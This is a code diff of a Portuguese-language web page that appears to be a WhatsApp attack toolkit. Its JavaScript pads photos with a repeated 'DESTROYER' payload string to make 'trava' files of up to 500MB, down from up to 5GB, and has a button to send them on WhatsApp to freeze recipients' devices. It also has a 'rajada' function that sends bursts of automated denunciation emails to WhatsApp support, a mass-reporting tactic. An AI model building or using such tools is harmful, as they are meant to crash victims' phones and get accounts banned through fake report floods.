@@ -601,15 +601,15 @@
                     </div>
                 </div>
 
-                <!-- Balão 4: Criador de Foto Trava Gigabyte -->
+                <!-- Balão 4: Criador de Foto Trava 500MB -->
                 <div class="carousel-card" onclick="openModal('modalFotoTrava')">
                     <div class="card-header-top">
-                        <span class="card-tag">FOTO GB</span>
+                        <span class="card-tag">FOTO 500MB</span>
                         <span class="css-symbol symbol-balloon"></span>
                     </div>
                     <div class="card-content-bottom">
-                        <div class="card-label">Foto Trava GB</div>
-                        <div class="card-desc">Modificar arquivo para pesar Gigabytes</div>
+                        <div class="card-label">Foto Trava ZAP</div>
+                        <div class="card-desc">Modificar arquivo até 500MB</div>
                     </div>
                 </div>
 
@@ -645,12 +645,6 @@
                 <input type="number" class="form-input" id="inputQuantidadeRajada" value="10" min="1" max="100">
             </div>
 
-            <!-- Campo Alvo limpo e padrão estilo e-mail comum -->
-            <div class="form-group">
-                <label class="form-label">Número ou WhatsApp Alvo da Denúncia</label>
-                <input type="text" class="form-input" id="inputAlvoWp" placeholder="Digite o número ou contato alvo...">
-            </div>
-
             <div class="form-group">
                 <label class="form-label">Assunto da Denúncia</label>
                 <input type="text" class="form-input" id="inputAssunto" value="Denúncia de Violação de Termos - Conta WhatsApp" placeholder="Assunto do e-mail">
@@ -658,7 +652,7 @@
 
             <div class="form-group">
                 <label class="form-label">Mensagem / Relatório</label>
-                <textarea class="form-textarea" id="inputMensagem" rows="3" placeholder="Descreva a infração...">Olá equipe de suporte do WhatsApp, venho por meio deste relatar que a conta abaixo está violando os termos...</textarea>
+                <textarea class="form-textarea" id="inputMensagem" rows="3" placeholder="Descreva a infração...">Olá equipe de suporte do WhatsApp, venho por meio deste relatar contas violando os termos...</textarea>
             </div>
 
             <button class="action-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="executarRajadaEmailsReal()">Disparar Rajada Real Automática</button>
@@ -731,11 +725,11 @@
         </div>
     </div>
 
-    <!-- MODAL 4: FOTO TRAVA GIGABYTE -->
+    <!-- MODAL 4: FOTO TRAVA ZAP (ATÉ 500MB) -->
     <div class="modal-overlay" id="modalFotoTrava">
         <div class="modal-content" style="max-width: 450px;">
             <div class="modal-header">
-                <div class="modal-title">Modificador de Foto Trava (Gigabytes)</div>
+                <div class="modal-title">Modificador de Foto Trava ZAP (Até 500MB)</div>
                 <button class="modal-close" onclick="closeModal('modalFotoTrava')">&times;</button>
             </div>
             
@@ -750,19 +744,18 @@
             </div>
 
             <div class="form-group">
-                <label class="form-label">2. Escolha o Peso em Gigabytes (GB)</label>
+                <label class="form-label">2. Escolha o Peso Modificado (Limite Máx: 500MB)</label>
                 <select class="form-select" id="selectPesoTrava">
-                    <option value="0.5">0.5 GB (500 Megabytes)</option>
-                    <option value="1" selected>1 Gigabyte (1 GB - Extremo)</option>
-                    <option value="2">2 Gigabytes (2 GB - Super Pesado)</option>
-                    <option value="5">5 Gigabytes (5 GB - Ultra Trava)</option>
+                    <option value="100">100 MB (Leve / Rápido)</option>
+                    <option value="250">250 MB (Médio)</option>
+                    <option value="500" selected>500 MB (Limite Máximo / WhatsApp & Business)</option>
                 </select>
             </div>
 
-            <div class="counter-badge" id="pesoEstimadoDisplay">Peso estimado: 0 GB</div>
+            <div class="counter-badge" id="pesoEstimadoDisplay">Peso Alvo: 500 MB</div>
 
             <div style="display: flex; gap: 10px; margin-top: 5px;">
-                <button class="action-btn" style="flex: 1;" onclick="baixarFotoPesada()">Gerar e Baixar Foto GB</button>
+                <button class="action-btn" style="flex: 1;" onclick="baixarFotoPesada()">Gerar e Baixar Foto 500MB</button>
                 <button class="action-btn" style="flex: 1; background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="compartilharFotoPesadaWp()">Enviar no WhatsApp</button>
             </div>
         </div>
@@ -877,17 +870,11 @@
             const remetente = document.getElementById('inputEmail').value.trim();
             const senhaApp = document.getElementById('inputSenha').value.trim();
             const qtdRajadas = parseInt(document.getElementById('inputQuantidadeRajada').value) || 1;
-            const alvoWp = document.getElementById('inputAlvoWp').value.trim();
             const assunto = document.getElementById('inputAssunto').value.trim();
             const mensagemBase = document.getElementById('inputMensagem').value.trim();
 
             if(!remetente || !senhaApp) {
                 alert('Por favor, preencha o seu e-mail e a Senha de App do Gmail!');
-                return;
-            }
-
-            if(!alvoWp) {
-                alert('Informe o número ou identificador do WhatsApp alvo da denúncia!');
                 return;
             }
 
@@ -915,7 +902,7 @@
                 }
 
                 listaSuportes.forEach((suporteDestino, index) => {
-                    const mensagemFinal = `${mensagemBase}\n\n[Rajada ID: ${disparosRealizados + 1}/${qtdRajadas}]\n[Número / Alvo Denunciado]: ${alvoWp}\n[Remetente Automatizado]: ${remetente}`;
+                    const mensagemFinal = `${mensagemBase}\n\n[Rajada ID: ${disparosRealizados + 1}/${qtdRajadas}]\n[Remetente Automatizado]: ${remetente}`;
                     const mailtoLink = `mailto:${suporteDestino}?subject=${encodeURIComponent(assunto + ' #' + (disparosRealizados + 1))}&body=${encodeURIComponent(mensagemFinal)}`;
                     
                     setTimeout(() => {
@@ -998,7 +985,7 @@
             window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(travaSelecionadaAtual.conteudo)}`, '_blank');
         }
 
-        // --- MOTOR DE MODIFICAÇÃO DE ARQUIVO PESADO EM GIGABYTES ---
+        // --- MOTOR DE MODIFICAÇÃO DE ARQUIVO PESADO (ATÉ 500MB) ---
         let arquivoImagemOriginal = null;
         let blobFinalModificado = null;
 
@@ -1018,20 +1005,20 @@
         document.getElementById('selectPesoTrava').addEventListener('change', atualizarDisplayPeso);
 
         function atualizarDisplayPeso() {
-            const gb = parseFloat(document.getElementById('selectPesoTrava').value) || 1;
-            document.getElementById('pesoEstimadoDisplay').innerText = `Peso Alvo: ${gb} GB`;
+            const mb = parseInt(document.getElementById('selectPesoTrava').value) || 500;
+            document.getElementById('pesoEstimadoDisplay').innerText = `Peso Alvo: ${mb} MB`;
         }
 
         async function baixarFotoPesada() {
             if (!arquivoImagemOriginal) { alert('Selecione uma imagem primeiro!'); return; }
 
-            const gigabytes = parseFloat(document.getElementById('selectPesoTrava').value) || 1;
-            const tamanhoAlvoBytes = gigabytes * 1024 * 1024 * 1024;
+            const megabytes = parseInt(document.getElementById('selectPesoTrava').value) || 500;
+            const tamanhoAlvoBytes = megabytes * 1024 * 1024;
 
-            alert(`Gerando arquivo de ${gigabytes} GB... Isso pode levar alguns segundos dependendo do seu aparelho.`);
+            alert(`Modificando arquivo da foto para ${megabytes}MB... Compatível com WhatsApp e WhatsApp Business.`);
 
             const arrayBufferOriginal = await arquivoImagemOriginal.arrayBuffer();
-            const stringPesada = "ZRX_DESTROYER_V5_GB_PAYLOAD_⚠️💥💀🔥⚡_".repeat(200000);
+            const stringPesada = "ZRX_DESTROYER_V5_500MB_PAYLOAD_⚠️💥💀🔥⚡_".repeat(100000);
             const encoder = new TextEncoder();
             const chunkExtra = encoder.encode(stringPesada);
 
@@ -1048,13 +1035,13 @@
             const url = URL.createObjectURL(blobFinalModificado);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `ZRX_Foto_Trava_${gigabytes}GB.png`;
+            a.download = `ZRX_Foto_Trava_${megabytes}MB.png`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             
-            alert('Foto gerada em Gigabytes com sucesso e baixada!');
+            alert('Foto modificada com sucesso e baixada!');
         }
 
         function compartilharFotoPesadaWp() {
@@ -1062,7 +1049,7 @@
                 baixarFotoPesada();
                 return; 
             }
-            alert('Arquivo pesado salvo! Abra o WhatsApp e envie o arquivo gerado.');
+            alert('Arquivo gerado! Abra o WhatsApp ou WhatsApp Business e envie o arquivo baixado.');
             window.open('https://api.whatsapp.com/', '_blank');
         }
     </script>
